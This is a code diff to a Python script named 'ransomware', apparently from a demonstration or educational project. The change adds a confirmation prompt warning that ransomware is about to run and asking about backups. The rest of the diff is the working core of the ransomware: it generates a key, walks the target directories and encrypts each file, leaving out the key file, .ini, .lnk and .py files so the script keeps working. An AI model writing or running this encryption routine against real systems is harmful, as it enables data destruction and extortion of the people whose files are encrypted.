@@ -133,18 +133,21 @@ def walk_files(directory):
 
 def ransomware(dirsToEncrypt):
 
-    # Generate an encryption key.
-    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating encryption key...")
-    generate_key()
+    areYouSure = input("WARNING: YOU ARE ABOUT TO EXECUTE RANSOMWARE ON YOUR SYSTEM. ARE YOU SURE YOU HAVE BACKUPS AND WISH TO PROCEED? (y/N) ")
+    if areYouSure == "y" or areYouSure == "Y" or areYouSure == "yes":
 
-    for dirToEncrypt in dirsToEncrypt:
+        # Generate an encryption key.
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating encryption key...")
+        generate_key()
 
-        for file_path in walk_files(dirToEncrypt):
-        
-            # DON'T ENCRYPT THE KEY FILE OR THIS PIECE OF CODE!
-            if file_path != keyfilePath and ".ini" not in file_path and ".lnk" not in file_path and ".py" not in file_path and "key.txt" not in file_path:
-                encrypt(file_path)
-                print(f"-> [{bcolors.FAIL}Encrypted{bcolors.ENDC}] [{bcolors.ORANGE}"+file_path+f"{bcolors.ENDC}]")
+        for dirToEncrypt in dirsToEncrypt:
+
+            for file_path in walk_files(dirToEncrypt):
+            
+                # DON'T ENCRYPT THE KEY FILE OR THIS PIECE OF CODE!
+                if file_path != keyfilePath and ".ini" not in file_path and ".lnk" not in file_path and ".py" not in file_path and "key.txt" not in file_path:
+                    encrypt(file_path)
+                    print(f"-> [{bcolors.FAIL}Encrypted{bcolors.ENDC}] [{bcolors.ORANGE}"+file_path+f"{bcolors.ENDC}]")
 
 #===========================#
 
